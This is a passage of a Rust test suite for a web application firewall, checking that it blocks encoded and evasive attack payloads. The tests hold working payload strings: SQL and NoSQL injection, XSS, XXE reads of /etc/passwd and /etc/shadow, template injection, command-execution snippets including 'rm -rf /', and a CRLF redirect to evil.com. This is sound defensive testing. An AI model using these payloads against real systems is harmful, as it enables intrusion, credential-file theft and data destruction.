            validate_request("PATCH", Some("application/json"), body, &strict_profile()),
            WafVerdict::Allow
        );
    }

    // ── Entropy ──

    #[test]
    fn allows_normal_entropy() {
        let body = br#"{"name":"John Doe","email":"john@example.com","message":"Hello, this is a normal message with typical text content."}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Allow
        );
    }

    // ── Shannon entropy unit test ──

    #[test]
    fn entropy_constant_is_zero() {
        let data = vec![b'A'; 100];
        assert!(shannon_entropy(&data) < 0.01);
    }

    #[test]
    fn entropy_random_is_high() {
        // Simulated high entropy (all 256 byte values)
        let data: Vec<u8> = (0..=255).cycle().take(512).collect();
        assert!(shannon_entropy(&data) > 7.5);
    }

    #[test]
    fn entropy_normal_text_is_moderate() {
        let data =
            b"This is a normal English text with reasonable entropy levels for testing purposes.";
        let e = shannon_entropy(data);
        assert!(e > 3.0 && e < 5.5, "entropy was {}", e);
    }

    // ── Plus-to-space evasion ──

    #[test]
    fn url_decode_converts_plus_to_space() {
        assert_eq!(
            url_decode(std::borrow::Cow::Borrowed(b"union+select")).as_ref(),
            b"union select"
        );
    }

    #[test]
    fn denies_plus_encoded_sqli_in_body() {
        // "union+select" → "union select" after + normalization
        let body = br#"{"query":"union+select+*+from+users"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected (encoded)")
        );
    }

    #[test]
    fn uri_denies_plus_encoded_sqli() {
        assert_eq!(
            validate_uri("/api/search?q='+or+1=1"),
            WafVerdict::Deny("injection pattern in URI (encoded)")
        );
    }

    #[test]
    fn url_decode_handles_mixed_encoding() {
        // %27 = ' and + = space
        assert_eq!(
            url_decode(std::borrow::Cow::Borrowed(b"admin%27+OR+%271%27=%271")).as_ref(),
            b"admin' or '1'='1"
        );
    }

    // ── SQL comment evasion ──

    #[test]
    fn strip_sql_comments_basic() {
        assert_eq!(
            strip_sql_comments(std::borrow::Cow::Borrowed(b"union/**/select")).as_ref(),
            b"union select"
        );
    }

    #[test]
    fn strip_sql_comments_nested_content() {
        assert_eq!(
            strip_sql_comments(std::borrow::Cow::Borrowed(b"union/*hack*/select")).as_ref(),
            b"union select"
        );
    }

    #[test]
    fn denies_sql_comment_evasion_in_body() {
        let body = br#"{"q":"union/**/select * from users"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected (encoded)")
        );
    }

    #[test]
    fn uri_denies_sql_comment_evasion() {
        assert_eq!(
            validate_uri("/search?q=union/**/select"),
            WafVerdict::Deny("injection pattern in URI (encoded)")
        );
    }

    // ── JSON unicode escape evasion ──

    #[test]
    fn normalize_json_unicode_basic() {
        // \u0027 = '  (single quote)
        assert_eq!(
            normalize_json_unicode(std::borrow::Cow::Borrowed(b"\\u0027")).as_ref(),
            b"'"
        );
    }

    #[test]
    fn normalize_json_unicode_angle_bracket() {
        // \u003c = <
        assert_eq!(
            normalize_json_unicode(std::borrow::Cow::Borrowed(b"\\u003cscript")).as_ref(),
            b"<script"
        );
    }

    #[test]
    fn denies_json_unicode_xss_in_body() {
        // \\u003c in raw bytes = literal \u003c after normalization
        // Use <script only (no alert) so raw scan doesn't match the literal
        let body = br#"{"html":"\\u003cscript src=x>"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected (encoded)")
        );
    }

    // ── New categories (v0.1.4) ──

    #[test]
    fn denies_xss_event_handler_oninput() {
        let body = br#"{"html":"<div oninput=alert(1)>"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn denies_xss_img_tag() {
        let body = br#"{"html":"<img src=x onerror=alert(1)>"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn denies_xss_srcdoc() {
        let body = br#"{"html":"<iframe srcdoc=<script>alert(1)</script>>"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn denies_xss_innerhtml() {
        let body = br#"{"code":"element.innerHTML = userInput"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn denies_nosql_injection_gt() {
        let body = br#"{"username":{"$gt":""},"password":{"$gt":""}}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn denies_nosql_injection_where() {
        let body = br#"{"$where":"this.password == 'admin'"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn denies_nosql_injection_regex() {
        let body = br#"{"username":{"$regex":".*"}}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn denies_java_deserialization() {
        let body = br#"{"cmd":"Runtime.getRuntime().exec('id')"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn denies_python_deserialization() {
        let body = br#"{"data":"pickle.loads(base64.b64decode(payload))"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn denies_python_os_system() {
        let body = br#"{"cmd":"os.system('rm -rf /')"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn denies_php_deserialization() {
        let body = br#"{"data":"unserialize($_GET['data'])"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn denies_php_filter_wrapper() {
        let body = br#"{"file":"php://filter/convert.base64-encode/resource=config.php"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn denies_graphql_introspection() {
        let body = br#"{"query":"{ __schema { types { name } } }"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn denies_graphql_type_probe() {
        let body = br#"{"query":"{__type(name:\"User\"){fields{name}}}"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn allows_legitimate_json_with_dollar() {
        // Legitimate JSON with $ in values (MongoDB query syntax in app code is fine)
        let body = br#"{"price":42.99,"currency":"$USD","note":"item costs $5"}"#;
        // $USD and $5 should NOT match $gt/$ne/$regex (those require exact prefix)
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Allow
        );
    }

    #[test]
    fn denies_ldap_injection() {
        let body = br#"{"filter":")(cn=*))"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn denies_xxe_entity() {
        let body = br#"{"xml":"<!ENTITY xxe SYSTEM \"file:///etc/passwd\">"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn denies_xxe_system_file() {
        let body = br#"{"dtd":"SYSTEM \"file:///etc/shadow\""}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn denies_ssti_jinja() {
        let body = br#"{"name":"{{7*7}}"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn denies_ssti_java() {
        let body = b"{\"expr\":\"#{t(java.lang.Runtime).getRuntime()}\"}";
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn denies_crlf_injection() {
        let body = br#"{"header":"value%0d%0aSet-Cookie: admin=true"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn denies_crlf_location_redirect() {
        let body = br#"{"url":"%0aLocation: http://evil.com"}"#;
        // Matches on raw scan: "%0alocation:" is a literal pattern (case-insensitive)
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn allows_legitimate_graphql_query() {
        // Normal GraphQL query without introspection
        let body = br#"{"query":"{ users(limit: 10) { id name email } }"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Allow
        );
    }
}
